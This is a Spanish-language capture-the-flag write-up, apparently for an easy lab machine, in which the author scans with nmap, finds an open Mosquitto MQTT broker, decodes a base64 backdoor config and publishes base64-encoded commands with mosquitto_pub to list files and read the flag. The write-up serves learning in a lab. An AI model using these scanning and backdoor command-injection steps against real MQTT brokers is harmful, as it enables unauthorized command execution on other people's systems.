@@ -1,0 +1,216 @@
+maquina bugged
+lvl: easy
+
+22/2/2024 19:24 ip:10.10.118.117
+
+#primer scan con nmap
+
+nmap -sC -sV 10.10.118.117 -T4
+
+Host is up (0.32s latency).
+All 1000 scanned ports on 10.10.118.117 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+#segundo scan
+nmap -p- --open -sS -T5 -vvv -n -Pn 10.10.118.117 -oG puertos\n
+
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE REASON
+1883/tcp open  mqtt    syn-ack ttl 62
+
+#tercer scan
+nmap -sC -sV -p1883 10.10.118.117
+
+PORT     STATE SERVICE                  VERSION
+1883/tcp open  mosquitto version 2.0.14
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|     $SYS/broker/load/publish/sent/5min: 6.48
+|     $SYS/broker/retained messages/count: 36
+|     $SYS/broker/load/connections/1min: 13.75
+|     $SYS/broker/load/bytes/received/5min: 3126.18
+|     $SYS/broker/load/bytes/sent/5min: 579.01
+|     $SYS/broker/load/messages/received/5min: 69.06
+|     $SYS/broker/load/messages/sent/1min: 120.27
+|     $SYS/broker/load/bytes/received/1min: 4378.90
+|     $SYS/broker/load/messages/received/1min: 102.04
+|     yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config: eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
+|     $SYS/broker/load/bytes/sent/15min: 233.36
+|     $SYS/broker/uptime: 385 seconds
+|     $SYS/broker/publish/bytes/received: 19663
+|     $SYS/broker/messages/received: 603
+|     $SYS/broker/messages/stored: 34
+|     $SYS/broker/bytes/received: 27729
+|     $SYS/broker/messages/sent: 643
+|     $SYS/broker/load/bytes/received/15min: 1503.80
+|     storage/thermostat: {"id":10032153342968534554,"temperature":23.77755}
+|     patio/lights: {"id":17625660905929801789,"color":"PURPLE","status":"OFF"}
+|     livingroom/speaker: {"id":17916796374634418674,"gain":68}
+|     $SYS/broker/publish/messages/sent: 61
+|     $SYS/broker/load/messages/received/15min: 32.86
+|     frontdeck/camera: {"id":13548775733901573127,"yaxis":142.35425,"xaxis":72.160324,"zoom":0.44420543,"movement":true}
+|     $SYS/broker/load/messages/sent/15min: 33.76
+|     $SYS/broker/load/sockets/1min: 13.75
+|     $SYS/broker/clients/connected: 2
+|     $SYS/broker/load/connections/5min: 4.05
+|     $SYS/broker/clients/maximum: 2
+|     $SYS/broker/clients/total: 2
+|     $SYS/broker/version: mosquitto version 2.0.14
+|     $SYS/broker/subscriptions/count: 3
+|     $SYS/broker/load/bytes/sent/1min: 1836.09
+|     $SYS/broker/bytes/sent: 5193
+|     $SYS/broker/publish/bytes/sent: 618
+|     kitchen/toaster: {"id":16345760228885245292,"in_use":true,"temperature":153.75397,"toast_time":201}
+|     $SYS/broker/store/messages/bytes: 274
+|     $SYS/broker/clients/active: 2
+|     $SYS/broker/load/connections/15min: 1.46
+|     $SYS/broker/load/publish/sent/15min: 2.19
+|     $SYS/broker/load/messages/sent/5min: 71.93
+|     $SYS/broker/load/sockets/15min: 1.46
+|     $SYS/broker/load/sockets/5min: 4.05
+|     $SYS/broker/load/publish/sent/1min: 30.15
+|_    $SYS/broker/store/messages/count: 34
+
+
+
+#cuarto scan
+nmap -sV -p1883 10.10.118.117 
+
+PORT     STATE SERVICE                  VERSION
+1883/tcp open  mosquitto version 2.0.14
+
+
+#quinto scan
+nmap -O -V -P1883 10.10.118.117
+
+PORT     STATE SERVICE
+1883/tcp open  mqtt
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 20.844 days (since Thu Feb  1 23:18:23 2024)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+
+busqueda sobre mosquitto
+
+#searchsploit mqtt
+
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Eclipse Mosquitto MQTT broker 2.0.9 - 'mosquitto' Unquoted Service Path            | windows/local/49673.txt
+Servisnet Tessa - MQTT Credentials Dump (Unauthenticated) (Metasploit)             | multiple/webapps/50713.rb
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+lo mismo buscando en exploit-db
+al tener la version 2.0.14 que es mas nueva al primer exploit (2.0.9) seria mejor probar primero con el segundo exploit
+servisnet tessa - MQTT Credential Dump
+
+Credential dump (volcado de credenciales):
+	Un "credential dump" es la extracción maliciosa de información de acceso, como nombres de usuario y contraseñas, de un sistema comprometido,
+	 que luego puede ser utilizada para acceder de manera no autorizada a cuentas o sistemas.
+
+
+------------------------------------------------------------------------------------------------------------------
+
+mientras tanto podemos entrar a cyberchef para tratar de decifrar lo encontrado en el scaneo
+
+eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
+
+
+pasandolo desde base64 obtenemos:
+{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
+
+id: cdd1b1c0-1c40-4b0f-8e22-61b357548b7d
+
+------------------------------------------------------------------------------------------------------------------
+
+primer intento con el comando
+
+mosquitto_sub -t 'test/topic' -h 10.10.215.253 -v
+
+con este nunca tuvimos respuesta, fue el script en python sacado de hacktriks, pagina que nos sirvo para entender mosquitto
+
+-----------------------------------------------------------------------------------
+
+
+CON
+└─# mosquitto_pub -h 10.10.215.253 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m '{HELP}' 
+
+#OBTENEMOS 
+
+SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
+
+Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
+
+Format: base64({"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d, "cmd": "CMD", "arg": "ls"})
+
+#lo pasamos a base64
+
+{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d, "cmd": "CMD", "arg": "ls"}
+=
+eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QsICJjbWQiOiAiQ01EIiwgImFyZyI6ICJscyJ9
+
+
+#lo usamos en mosquitto_pub
+
+#el id q estoy usando puede ser incorrecto por ser de una sesion de THM vieja tengo que escanear de nuevo y buscar un nuevo id y directorio
+#con un nuevo scan obtengo este nuevo code base64
+
+yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config: eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
+#lo paso por le cyberchef y obtengo
+
+
+{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
+
+#nuevo id es: cdd1b1c0-1c40-4b0f-8e22-61b357548b7d
+#sub topic: XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub 
+
+{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
+
+#es igual a
+
+eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==
+
+#obtengo nuevo resultado
+
+eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9
+#que es
+{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}
+
+#ahora podemos intentar leer esta flag con
+{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}
+#q es
+eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
+
+#en la respuesta obtenemos 
+eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9
+#lo cual es 
+{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"}
+
+
+flag{18d44fc0707ac8dc8be45bb83db54013}
+
+
+en resumen 
+
+con este comando escuchamos en mosquitto
+
+mosquitto_sub -h 10.10.215.253 -t '#'
+
+y con este comando inyectamos comandos por medio de codigo base64 para buscar y leer la flag
+
+mosquitto_pub -h 10.10.215.253 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m '{HELP}' 
+#ESTA FUE LA PRIMER VARIANTE, tambien probamos con SYS y CMD
+
+└─# mosquitto_pub -h 10.10.215.253 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ=='            
+#ESTA FUE LA OPCION UTILIZADA PARA EJECUTAR EL COMANDO ls Y ENCONTRAR flag.txt
+
+mosquitto_pub -h 10.10.215.253 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0='
+#ESTA FUE LA ULTIMA OPCION PARA LEER LA FLAG
+
+en este siempre tuvimos que ir cambiando el input en base64 para ver los resultados, el error del comienso no era una id de sesion diferente sino que me faltaba una ' en el final
